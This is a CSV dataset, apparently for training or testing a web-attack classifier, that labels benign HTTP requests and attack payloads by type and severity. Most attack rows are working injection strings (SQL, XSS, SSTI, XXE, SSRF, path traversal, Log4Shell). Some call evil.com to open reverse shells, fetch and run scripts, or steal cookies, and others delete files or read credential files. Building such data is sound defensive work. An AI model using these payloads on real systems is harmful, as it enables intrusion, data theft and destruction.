text,label,attack_type,severity
Referer: http://target.com/?q=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///c:/windows/win.ini%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
"GET /search?input=http://localhost:8080/manager HTTP/1.1
Host: target.com",1,ssrf,high
"GET /search?input=%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
Referer: http://target.com/?q=;%20cat%20/etc/passwd,1,command_injection,critical
"POST /api/feedback body={{""message"":""1""}}",0,normal,none
X-Forwarded-For: ${jndi:ldap://evil.com/${java:os}},1,log4shell,critical
"GET /search?input=%3Ciframe%20onload=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
GET /images/john_doe.png,0,normal,none
POST /api/cart add item=faq,0,normal,none
GET /docs/database.html,0,normal,none
GET /api/status?service=web-development,0,normal,none
"GET /page?id=1' AND SLEEP(5)-- HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: | uname -a,1,command_injection,critical
"GET /search?input=http://localhost:8080/manager HTTP/1.1
Host: target.com",1,ssrf,high
"GET /search?input=1%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: & cat /etc/passwd,1,command_injection,critical
X-Forwarded-For: username=postgres&password=postgres,1,brute_force,low
"id=1%20AND%201=CONVERT%28int,@@version%29--",1,sql_injection,high
"content-type: application/json
body: {{""name"":""10""}}",0,normal,none
create new post title=about,0,normal,none
GET /users/de/profile HTTP/1.1,0,normal,none
Referer: http://target.com/?q=#set%28$x=%27%27%29#set%28$rt=$x.class.forName%28%27java.lang.Runtime%27%29%29#set%28$chr=$x.class.forName%28%27java.lang.Character%27%29%29#set%28$str=$x.class.forName%28%27java.lang.String%27%29%29#set%28$ex=$rt.getRuntime%28%29.exec%28%27id%27%29%29$ex.waitFor%28%29,1,ssti,high
"GET /page?id=1%27%20AND%20%28SELECT%20*%20FROM%20users%29%20%3E%200-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input=..\..\..\..\windows\system32\drivers\etc\hosts HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=username=admin&password=123456 HTTP/1.1
Host: target.com",1,brute_force,low
"content-type: application/json
body: {{""name"":""10""}}",0,normal,none
%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1,xss,medium
"POST /api/feedback body={{""message"":""xml""}}",0,normal,none
User-Agent: 1%27%20AND%20SLEEP%285%29--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=|%20id",1,command_injection,critical
GET /products/1 HTTP/1.1,0,normal,none
edit comment id=contact,0,normal,none
"GET /search?input=....//....//....//etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
X-Forwarded-For: <meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,1,xss,medium
' OR 1=1--,1,sql_injection,high
"GET /search?input=http://100.100.100.200/latest/meta-data/ HTTP/1.1
Host: target.com",1,ssrf,high
Referer: http://target.com/?q=../../../../etc/passwd,1,path_traversal,medium
X-Forwarded-For: ../../../../var/log/nginx/access.log,1,path_traversal,medium
sort items by bob ascending,0,normal,none
Referer: http://target.com/?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a},1,log4shell,critical
User-Agent: expect://id,1,path_traversal,medium
"GET /page?id=%3C?xml?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///proc/self/environ%22%3E]%3E HTTP/1.1
Host: target.com",1,xxe,high
X-Forwarded-For: 1' ORDER BY 1--,1,sql_injection,high
username=admin&password=%27%20OR%20%271%27=%271,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=redirect=http://169.254.169.254",1,ssrf,high
export report javascript,0,normal,none
delete item id=jane_smith,0,normal,none
filter results by category=fr,0,normal,none
PUT /api/users/report-january/settings,0,normal,none
GET /users/cloud-computing/profile HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cscript%3Efetch%28%27http://evil.com?c=%27+btoa%28document.cookie%29%29%3C/script%3E",1,xss,medium
http://127.0.0.1:3306,1,ssrf,high
"GET /search?input=sftp://127.0.0.1:22 HTTP/1.1
Host: target.com",1,ssrf,high
User-Agent: <p onmouseover='alert(1)'>hover</p>,1,xss,medium
"GET /page?id=username=root&password=toor HTTP/1.1
Host: target.com",1,brute_force,low
../../../../var/log/nginx/access.log,1,path_traversal,medium
X-Forwarded-For: 1;%20WAITFOR%20DELAY%20%270:0:5%27--,1,sql_injection,high
GET /users/name/profile HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//evil.com/a}",1,log4shell,critical
X-Forwarded-For: %3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/convert.base64-encode/resource=/etc/passwd%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
../../../../proc/version,1,path_traversal,medium
"GET /search?input=..\..\..\windows\win.ini HTTP/1.1
Host: target.com",1,path_traversal,medium
export report jane_smith,0,normal,none
delete item id=2024,0,normal,none
GET /users/100/profile HTTP/1.1,0,normal,none
PUT /api/users/de/settings,0,normal,none
User-Agent: %3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E,1,xss,medium
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}{% endif %}{% endfor %},1,ssti,high
"content-type: application/json
body: {{""name"":""bob""}}",0,normal,none
%3Ca%20href=%27javascript:alert%281%29%27%3Eclick%3C/a%3E,1,xss,medium
"GET /search?input=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20lolz%20[%3C!ENTITY%20lol%20%22lol%22%3E%3C!ENTITY%20lol9%20%22&lol;&lol;&lol;%22%3E]%3E%3Cfoo%3E&lol9;%3C/foo%3E HTTP/1.1
Host: target.com",1,xxe,high
filter results by category=es,0,normal,none
X-Forwarded-For: 1' AND 1=1--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=<object data=javascript:alert(1)>",1,xss,medium
X-Forwarded-For: %27%20OR%20%271%27=%271%27%20/*,1,sql_injection,high
GET /users/database/profile HTTP/1.1,0,normal,none
User-Agent: zip://path/to/file.zip#file.php,1,path_traversal,medium
GET /search?q=cloud-computing&page=1,0,normal,none
X-Forwarded-For: %3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,1,xss,medium
User-Agent: ../../../../proc/version,1,path_traversal,medium
GET /docs/faq.html,0,normal,none
Referer: http://target.com/?q=| cat /etc/shadow,1,command_injection,critical
"GET /search?input=../../../../etc/shadow HTTP/1.1
Host: target.com",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=/var/www/../../etc/passwd",1,path_traversal,medium
"GET /search?input=user=user1&pass=pass1 HTTP/1.1
Host: target.com",1,brute_force,low
{{config}},1,ssti,high
export report data-science,0,normal,none
"User-Agent: %3C!DOCTYPE%20test%20[%20%3C!ENTITY%20%%20init%20SYSTEM%20%22data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk%22%3E%20%init;%20]%3E%3Cfoo/%3E",1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=file:///etc/passwd",1,path_traversal,medium
export report services,0,normal,none
User-Agent: admin%27/*,1,sql_injection,high
User-Agent: login=admin&pass=admin,1,brute_force,low
User-Agent: 1;%20SELECT%20pg_sleep%285%29--,1,sql_injection,high
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=expression%28alert%281%29%29",1,xss,medium
Referer: http://target.com/?q=`cat%20/etc/passwd`,1,command_injection,critical
download file john_doe.pdf,0,normal,none
delete item id=january,0,normal,none
GET /search?q=size&page=1,0,normal,none
Referer: http://target.com/?q={{%27%27|attr%28%27__class__%27%29|attr%28%27__base__%27%29|attr%28%27__subclasses__%27%29%28%29}},1,ssti,high
X-Api-Version:%20${jndi:ldap://evil.com/a},1,log4shell,critical
Referer: http://target.com/?q=%3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E,1,xss,medium
Referer: http://target.com/?q=%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--,1,sql_injection,high
"GET /search?input={{%27%27.__class__.__mro__[2].__subclasses__%28%29}} HTTP/1.1
Host: target.com",1,ssti,high
GET /api/status?service=fr,0,normal,none
User-Agent: 1'; DROP TABLE users--,1,sql_injection,high
GET /api/status?service=products,0,normal,none
expression(alert(1)),1,xss,medium
GET /images/date.png,0,normal,none
delete item id=data-science,0,normal,none
User-Agent: %3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1,xss,medium
X-Forwarded-For: ../etc/passwd,1,path_traversal,medium
"GET /page?id=' UNION SELECT NULL,NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
Referer: http://target.com/?q=%27%20OR%20SLEEP%285%29--,1,sql_injection,high
User-Agent: &%20id,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cform%20action=%27javascript:alert%281%29%27%3E%3Cinput%20type=submit%3E%3C/form%3E",1,xss,medium
sort items by name ascending,0,normal,none
"GET /page?id=%26%26id HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=url=http://127.0.0.1",1,ssrf,high
"<!DOCTYPE test [ <!ENTITY % init SYSTEM ""data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk""> %init; ]><foo/>",1,xxe,high
export report pdf,0,normal,none
"GET /page?id=User-Agent:%20${jndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
GET /api/status?service=machine-learning,0,normal,none
"GET /page?id=1;%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: target.com",1,sql_injection,high
download file 2024.pdf,0,normal,none
X-Forwarded-For: |%20crontab%20-l,1,command_injection,critical
User-Agent: X-Api-Version:%20${jndi:ldap://evil.com/a},1,log4shell,critical
%27%20AND%20EXISTS%28SELECT%20*%20FROM%20users%29--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input={{''.class.mro()[1].subclasses()}}",1,ssti,high
"GET /search?input=%3Clink%20rel=import%20href=javascript:alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=..\..\..\..\windows\system32\drivers\etc\hosts",1,path_traversal,medium
%3Ciframe%20onload=alert%281%29%3E,1,xss,medium
%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
"GET /search?input=%27%20GROUP%20BY%201-- HTTP/1.1
Host: target.com",1,sql_injection,high
%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/shadow%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
username=xlsx&action=login,0,normal,none
Referer: http://target.com/?q=%0a%20cat%20/etc/passwd,1,command_injection,critical
search query for de,0,normal,none
"GET /page?id=<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]><foo>&xxe;</foo> HTTP/1.1
Host: target.com",1,xxe,high
GET /blog/10 HTTP/1.1,0,normal,none
X-Forwarded-For: email=admin@admin.com&password=admin,1,brute_force,low
Referer: http://target.com/?q=1%27%20ORDER%20BY%201--,1,sql_injection,high
GET /api/status?service=green,0,normal,none
X-Forwarded-For: |%20ifconfig,1,command_injection,critical
$(jndi:ldap://evil.com/a),1,log4shell,critical
User-Agent: <IMG SRC=javascript:alert('XSS')>,1,xss,medium
export report date,0,normal,none
"GET /search?input=${jndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
edit comment id=fr,0,normal,none
"GET /search?input=X-Api-Version:%20${jndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
|%20ipconfig,1,command_injection,critical
GET /api/status?service=10,0,normal,none
User-Agent: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=; netstat -an",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=Authorization: Basic YWRtaW46YWRtaW4=",1,brute_force,low
| ipconfig,1,command_injection,critical
<body onload=alert(1)>,1,xss,medium
"content-type: application/json
body: {{""name"":""data-science""}}",0,normal,none
%27%20HAVING%201=1--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=%22%3E%3Cimg%20src=x%20onerror=alert%281%29%3E",1,xss,medium
edit comment id=tablets,0,normal,none
"GET /search?input=%3Cvideo%20src=x%20onerror=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
PUT /api/users/database/settings,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=1%20OR%201=1",1,sql_injection,high
"GET /page?id=../../../../home/user/.ssh/id_rsa HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},1,ssti,high
Referer: http://target.com/?q=admin%27/*,1,sql_injection,high
search query for name,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20UNION%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
GET /users/report-january/profile HTTP/1.1,0,normal,none
Referer: http://target.com/?q=../../../../proc/version,1,path_traversal,medium
filter results by category=user123,0,normal,none
`ls%20-la`,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=http://10.0.0.1/admin",1,ssrf,high
load data from name,0,normal,none
GET /blog/summary-q3 HTTP/1.1,0,normal,none
POST /api/cart add item=about,0,normal,none
PUT /api/users/green/settings,0,normal,none
"content-type: application/json
body: {{""name"":""en""}}",0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%27;%20UPDATE%20users%20SET%20password=%27hacked%27%20WHERE%20%271%27=%271%27--",1,sql_injection,high
GET /category/summary-q3/items,0,normal,none
User-Agent: 1; EXEC xp_cmdshell('dir c:\')--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=username=jenkins&password=jenkins",1,brute_force,low
User-Agent: username=guest&password=guest,1,brute_force,low
"GET /search?input=1;%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input=%27%20OR%20%271%27=%271%27%20/* HTTP/1.1
Host: target.com",1,sql_injection,high
next=http://127.0.0.1:8080,1,ssrf,high
POST /api/cart add item=green,0,normal,none
"GET /page?id=${jndi:ldap://evil.com/${java:version}} HTTP/1.1
Host: target.com",1,log4shell,critical
X-Forwarded-For: <iframe onload=alert(1)>,1,xss,medium
"GET /page?id=&%20ping%20-c%201%20evil.com HTTP/1.1
Host: target.com",1,command_injection,critical
"User-Agent: id=1%20AND%201=CONVERT%28int,@@version%29--",1,sql_injection,high
X-Forwarded-For: ; uname -a,1,command_injection,critical
"User-Agent: %3C!DOCTYPE%20test%20[%20%3C!ENTITY%20%%20init%20SYSTEM%20%22data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk%22%3E%20%init;%20]%3E%3Cfoo/%3E",1,xxe,high
PUT /api/users/en/settings,0,normal,none
upload image photo_xml.jpg,0,normal,none
"GET /search?input=& ping -c 1 evil.com HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=User-Agent:%20${jndi:ldap://evil.com/a}",1,log4shell,critical
view page number ar,0,normal,none
"GET /search?input={{range.constructor%28%27return%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22id%22%29%27%29%28%29}} HTTP/1.1
Host: target.com",1,ssti,high
X-Forwarded-For: %27%20OR%20%271%27=%271%27--,1,sql_injection,high
${jndi:dns://evil.com/a},1,log4shell,critical
X-Forwarded-For: ;%20ps%20aux,1,command_injection,critical
%2e%2e/%2e%2e/%2e%2e/etc/passwd,1,path_traversal,medium
"GET /search?input=' OR SLEEP(5)-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input={{%27%27|attr%28%27__class__%27%29|attr%28%27__base__%27%29|attr%28%27__subclasses__%27%29%28%29}} HTTP/1.1
Host: target.com",1,ssti,high
"GET /search?input=| rm -rf / HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=php://filter/read=convert.base64-encode/resource=index.php",1,path_traversal,medium
"GET /search?input=%3Ciframe%20src=javascript:alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /search?input=$%28cat%20/etc/passwd%29 HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: | ls -la,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=sftp://127.0.0.1:22",1,ssrf,high
"GET /search?input=%3Csvg%20onload=alert%28document.domain%29%3E HTTP/1.1
Host: target.com",1,xss,medium
POST /api/cart add item=es,0,normal,none
%3Cobject%20data=javascript:alert%281%29%3E,1,xss,medium
User-Agent: %27%20OR%20%271%27=%271,1,sql_injection,high
GET /images/alice.png,0,normal,none
username=electronics&action=login,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=;%20python%20-c%20%27import%20socket,subprocess,os;s=socket.socket%28%29;s.connect%28%28%22evil.com%22,4444%29%29;os.dup2%28s.fileno%28%29,0%29;os.dup2%28s.fileno%28%29,1%29;os.dup2%28s.fileno%28%29,2%29;p=subprocess.call%28[%22/bin/sh%22,%22-i%22]%29%27",1,command_injection,critical
http://127.0.0.1#evil.com,1,ssrf,high
POST /api/cart add item=jane_smith,0,normal,none
Referer: http://target.com/?q=admin'/*,1,sql_injection,high
Referer: http://target.com/?q=file:///etc/passwd,1,path_traversal,medium
X-Forwarded-For: 1%27%20AND%20SLEEP%285%29--,1,sql_injection,high
"GET /search?input=$(jndi:ldap://evil.com/a) HTTP/1.1
Host: target.com",1,log4shell,critical
User-Agent: %3Cdetails%20open%20ontoggle=alert%281%29%3E,1,xss,medium
User-Agent: ; cat /etc/shadow,1,command_injection,critical
GET /blog/cloud-computing HTTP/1.1,0,normal,none
"<!DOCTYPE foo [<!ENTITY xxe ""test""> <!ENTITY xxe2 ""&xxe;&xxe;&xxe;"">]>",1,xxe,high
"GET /page?id=file:///c:/boot.ini HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: <iframe src=javascript:alert(1)>,1,xss,medium
"GET /page?id=../../../etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
delete item id=2024,0,normal,none
username=guest&password=guest,1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=1%27%20AND%20%28SELECT%20*%20FROM%20users%29%20%3E%200--",1,sql_injection,high
GET /docs/xlsx.html,0,normal,none
GET /category/de/items,0,normal,none
GET /category/blue/items,0,normal,none
edit comment id=machine-learning,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20GROUP%20BY%201--",1,sql_injection,high
GET /products/cameras HTTP/1.1,0,normal,none
GET /images/data-science.png,0,normal,none
sort items by about ascending,0,normal,none
X-Forwarded-For: %3Cscript%3Efetch%28%27http://evil.com?c=%27+btoa%28document.cookie%29%29%3C/script%3E,1,xss,medium
"GET /search?input=`env` HTTP/1.1
Host: target.com",1,command_injection,critical
Referer: http://target.com/?q=http://127.0.0.1:22,1,ssrf,high
X-Forwarded-For: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd,1,path_traversal,medium
"<!DOCTYPE test [ <!ENTITY % init SYSTEM ""data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk""> %init; ]><foo/>",1,xxe,high
PUT /api/users/march/settings,0,normal,none
User-Agent: zip://path/to/file.zip#file.php,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=/var/www/../../etc/passwd",1,path_traversal,medium
onmouseover=alert%281%29,1,xss,medium
X-Forwarded-For: %3Cbody%20onload=alert%281%29%3E,1,xss,medium
"GET /page?id=<object data=javascript:alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
Referer: http://target.com/?q=http://metadata.google.internal/computeMetadata/v1/,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=<img src=x onerror=alert('XSS')>",1,xss,medium
Referer: http://target.com/?q=Authorization:%20Basic%20dGVzdDp0ZXN0,1,brute_force,low
"GET /page?id=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
User-Agent: %3Cscript%3Edocument.location=%27http://evil.com/steal?c=%27+document.cookie%3C/script%3E,1,xss,medium
filter results by category=10,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=http://[::1]/admin",1,ssrf,high
"User-Agent: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",1,xxe,high
X-Forwarded-For: %3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,1,xss,medium
GET /category/date/items,0,normal,none
X-Forwarded-For: %3Csvg%20onload=alert%28document.domain%29%3E,1,xss,medium
sort items by january ascending,0,normal,none
X-Forwarded-For: username=tomcat&password=tomcat,1,brute_force,low
delete item id=alice,0,normal,none
"GET /page?id=${%22freemarker.template.utility.Execute%22?new%28%29%28%22id%22%29} HTTP/1.1
Host: target.com",1,ssti,high
"GET /search?input=%27%20OR%20%271%27=%271%27%20/* HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/feedback body={{""message"":""order-12345""}}",0,normal,none
%27;%20DROP%20TABLE%20users--,1,sql_injection,high
GET /search?q=xlsx&page=1,0,normal,none
"X-Forwarded-For: %27%20AND%201=CONVERT%28int,@@version%29--",1,sql_injection,high
download file ar.pdf,0,normal,none
POST /api/cart add item=contact,0,normal,none
"POST /api/feedback body={{""message"":""machine-learning""}}",0,normal,none
"GET /search?input=%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /page?id=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1
Host: target.com",1,path_traversal,medium
GET /search?q=csv&page=1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=../../../../home/user/.ssh/id_rsa",1,path_traversal,medium
User-Agent: 1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input='; DROP TABLE users--",1,sql_injection,high
GET /blog/xml HTTP/1.1,0,normal,none
username=faq&action=login,0,normal,none
search query for order-12345,0,normal,none
;%20nc%20-e%20/bin/bash%20evil.com%204444,1,command_injection,critical
"GET /search?input=<object data=javascript:alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3C#assign%20ex=%22freemarker.template.utility.Execute%22?new%28%29%3E${ex%28%22id%22%29}",1,ssti,high
Referer: http://target.com/?q=..%2f..%2f..%2fetc%2fpasswd,1,path_traversal,medium
GET /api/status?service=2025,0,normal,none
search query for fr,0,normal,none
|%20chmod%20+s%20/bin/bash,1,command_injection,critical
PUT /api/users/de/settings,0,normal,none
X-Forwarded-For: ..%252f..%252f..%252fetc%252fpasswd,1,path_traversal,medium
"POST /api/feedback body={{""message"":""1""}}",0,normal,none
view page number python,0,normal,none
Referer: http://target.com/?q=127.0.0.1; ls,1,command_injection,critical
"GET /search?input=$(cat /etc/passwd) HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=1%20OR%201=1",1,sql_injection,high
X-Forwarded-For: file:///etc/passwd,1,path_traversal,medium
X-Forwarded-For: |%20rm%20-rf%20/,1,command_injection,critical
Referer: http://target.com/?q=; netstat -an,1,command_injection,critical
"GET /page?id=http://10.0.0.1/admin HTTP/1.1
Host: target.com",1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=Authorization:%20Basic%20cm9vdDpyb290",1,brute_force,low
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,path_traversal,medium
GET /users/alice/profile HTTP/1.1,0,normal,none
Referer: http://target.com/?q=%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--,1,sql_injection,high
User-Agent: ; wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh,1,command_injection,critical
"GET /page?id=' OR pg_sleep(5)-- HTTP/1.1
Host: target.com",1,sql_injection,high
X-Forwarded-For: | whoami,1,command_injection,critical
POST /api/cart add item=database,0,normal,none
"User-Agent: %27%20UNION%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
Referer: http://target.com/?q=1%27%20ORDER%20BY%2010--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=${jndi:ldap://evil.com/${env:AWS_ACCESS_KEY_ID}}",1,log4shell,critical
edit comment id=pdf,0,normal,none
";%20python%20-c%20%27import%20socket,subprocess,os;s=socket.socket%28%29;s.connect%28%28%22evil.com%22,4444%29%29;os.dup2%28s.fileno%28%29,0%29;os.dup2%28s.fileno%28%29,1%29;os.dup2%28s.fileno%28%29,2%29;p=subprocess.call%28[%22/bin/sh%22,%22-i%22]%29%27",1,command_injection,critical
upload image photo_smartphones.jpg,0,normal,none
"POST /api/feedback body={{""message"":""pdf""}}",0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29,1,1%29%29%3E64--",1,sql_injection,high
X-Forwarded-For: 1%27%20AND%201=1--,1,sql_injection,high
PUT /api/users/2/settings,0,normal,none
edit comment id=contact,0,normal,none
"GET /search?input=#{7*7} HTTP/1.1
Host: target.com",1,ssti,high
"GET /page?id=username=tomcat&password=tomcat HTTP/1.1
Host: target.com",1,brute_force,low
"GET /search?input=search=%27%20OR%201=1--&submit=Search HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20%3C!ENTITY%20%%20load%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=file:///etc/passwd%22%3E]%3E",1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=username=tomcat&password=tomcat",1,brute_force,low
GET /api/status?service=services,0,normal,none
"GET /page?id=1' AND (SELECT * FROM users) > 0-- HTTP/1.1
Host: target.com",1,sql_injection,high
GET /docs/products.html,0,normal,none
X-Forwarded-For: |%20cat%20/etc/passwd,1,command_injection,critical
GET /images/summary-q3.png,0,normal,none
POST /api/cart add item=de,0,normal,none
"POST /api/orders body={{""item"":""invoice-2024""}}",0,normal,none
GET /images/electronics.png,0,normal,none
GET /search?q=invoice-2024&page=1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=http://169.254.169.254/computeMetadata/v1/",1,ssrf,high
Referer: http://target.com/?q=${jndi:ldap://127.0.0.1:1389/a},1,log4shell,critical
%2e%2e/%2e%2e/%2e%2e/etc/passwd,1,path_traversal,medium
